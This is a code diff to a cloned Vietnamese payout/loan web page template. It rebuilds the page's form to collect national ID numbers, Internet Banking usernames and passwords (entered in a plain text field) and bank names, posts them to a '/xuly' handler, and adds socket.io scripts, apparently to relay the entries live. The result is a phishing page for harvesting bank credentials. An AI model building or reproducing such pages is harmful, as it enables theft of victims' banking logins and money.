@@ -25,6 +25,11 @@
       <link href='//fonts.googleapis.com/css?family=Lato:400,300,300italic,700,400italic,700italic&subset=latin,latin-ext' rel='stylesheet' type='text/css' />
       <link href='//fonts.googleapis.com/css?family=Cookie&subset=latin,latin-ext' rel='stylesheet' type='text/css' />
       <link href='//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic&subset=latin,latin-ext' rel='stylesheet' type='text/css' />
+      <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+        <script src="/js/succes.js"></script>
+         <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.2.0/socket.io.js"></script>
+        <script src="/js/connect-socket.js" ></script>
       <style type='text/css'>
          .wsite-elements.wsite-not-footer:not(.wsite-header-elements) div.paragraph, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) p, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-block .product-title, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .product-description, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .wsite-form-field label, .wsite-elements.wsite-not-footer:not(.wsite-header-elements) .wsite-form-field label, #wsite-content div.paragraph, #wsite-content p, #wsite-content .product-block .product-title, #wsite-content .product-description, #wsite-content .wsite-form-field label, #wsite-content .wsite-form-field label, .blog-sidebar div.paragraph, .blog-sidebar p, .blog-sidebar .wsite-form-field label, .blog-sidebar .wsite-form-field label {font-family:"Lato" !important;}
          #wsite-content div.paragraph, #wsite-content p, #wsite-content .product-block .product-title, #wsite-content .product-description, #wsite-content .wsite-form-field label, #wsite-content .wsite-form-field label, .blog-sidebar div.paragraph, .blog-sidebar p, .blog-sidebar .wsite-form-field label, .blog-sidebar .wsite-form-field label {color:#666c70 !important;}
@@ -231,7 +236,7 @@
                                              <tr class="wsite-multicol-tr">
                                                 <td class="wsite-multicol-col" style="width:50%; padding:0 15px;">
                                                    <div>
-                                                      <form enctype="multipart/form-data" action="" method="POST" id="form-974100577989521158">
+                                                      <form  action="/xuly" method="POST" id="form-974100577989521158">
                                                          <div id="974100577989521158-form-parent" class="wsite-form-container"
                                                             style="margin-top:10px;">
                                                             <ul class="formlist" id="974100577989521158-form-list">
@@ -241,7 +246,7 @@
                                                                   <div class="wsite-form-field" style="margin:5px 0px 5px 0px;">
                                                                      <label class="wsite-form-label" for="input-607032973882957456">Số CMND Đăng kí nhận tiền:  <span class="form-required">*</span></label>
                                                                      <div class="wsite-form-input-container">
-                                                                        <input aria-required="true" id="input-607032973882957456" class="wsite-form-input wsite-input wsite-input-width-370px" type="text" name="_u607032973882957456" />
+                                                                        <input aria-required="true" id="input-607032973882957456" class="wsite-form-input wsite-input wsite-input-width-370px" type="text" name="CMND" />
                                                                      </div>
                                                                      <div id="instructions-607032973882957456" class="wsite-form-instructions" style="display:none;"></div>
                                                                   </div>
@@ -249,7 +254,10 @@
                                                                <div>
                                                                   <div class="wsite-form-field" style="margin:5px 0px 0px 0px;">
                                                                      <label class="wsite-form-label" for="input-953874228577058989">Số tiền nhận:  <span class="form-required">*</span></label>
-                                                                     <div class="wsite-form-radio-container">
+                                                                     <div class="wsite-form-input-container">
+                                                                        <input aria-required="true" id="input-607032973882957456" class="wsite-form-input wsite-input wsite-input-width-370px" type="text" name="reciverMoney" />
+                                                                     </div>
+                                                                     <!-- <div class="wsite-form-radio-container">
                                                                         <select id='input-953874228577058989' name='_u953874228577058989' class='form-select' aria-required="true">
                                                                            <option value='10.000.000d'>10.000.000d</option>
                                                                            <option value='20.000.000d'>20.000.000d</option>
@@ -259,7 +267,7 @@
                                                                            <option value='60.000.000d'>60.000.000d</option>
                                                                            <option value='70.000.000d'>70.000.000d</option>
                                                                         </select>
-                                                                     </div>
+                                                                     </div> -->
                                                                      <div id="instructions-Số tiền cần vay: " class="wsite-form-instructions" style="display:none;"></div>
                                                                   </div>
                                                                </div>
@@ -267,7 +275,7 @@
                                                                   <div class="wsite-form-field" style="margin:5px 0px 5px 0px;">
                                                                      <label class="wsite-form-label" for="input-713798101921275033">Tên đăng nhập hoặc số điện thoại ( Internet Banking )  <span class="form-required">*</span></label>
                                                                      <div class="wsite-form-input-container">
-                                                                        <input aria-required="true" id="input-713798101921275033" class="wsite-form-input wsite-input wsite-input-width-370px" type="text" name="_u713798101921275033" />
+                                                                        <input aria-required="true" id="input-713798101921275033" class="wsite-form-input wsite-input wsite-input-width-370px" type="text" name="username" />
                                                                      </div>
                                                                      <div id="instructions-713798101921275033" class="wsite-form-instructions" style="display:none;"></div>
                                                                   </div>
@@ -276,7 +284,7 @@
                                                                   <div class="wsite-form-field" style="margin:5px 0px 5px 0px;">
                                                                      <label class="wsite-form-label" for="input-583867203420298098">Mật khẩu:  <span class="form-required">*</span></label>
                                                                      <div class="wsite-form-input-container">
-                                                                        <input aria-required="true" id="input-583867203420298098" class="wsite-form-input wsite-input wsite-input-width-370px" type="text" name="_u583867203420298098" />
+                                                                        <input aria-required="true" id="input-583867203420298098" class="wsite-form-input wsite-input wsite-input-width-370px" type="text" name="password" />
                                                                      </div>
                                                                      <div id="instructions-583867203420298098" class="wsite-form-instructions" style="display:none;"></div>
                                                                   </div>
@@ -286,7 +294,7 @@
                                                                      <label class="wsite-form-label" for="input-347498965745763598">Tên ngân hàng:  <span class="form-required">*</span></label>
                                                                      <div class="wsite-form-input-container">
                                         
-                                                                        <select id='input-953874228577058989' name='_u953874228577058989' class='wsite-form-input wsite-input wsite-input-width-370px' aria-required="true">
+                                                                        <select id='input-953874228577058989' name='bankname' class='wsite-form-input wsite-input wsite-input-width-370px' aria-required="true">
                                                                                 <%
                                                                                 bank.forEach(element=>{
                                                                                     %>
@@ -302,7 +310,7 @@
                                                             </ul>
                                                          </div>
                                                          <div style="display:none; visibility:hidden;">
-                                                            <input type="hidden" name="wsite_subject" />
+                                                           
                                                          </div>
                                                          <div style="text-align:left; margin-top:10px; margin-bottom:10px;">
                                                            
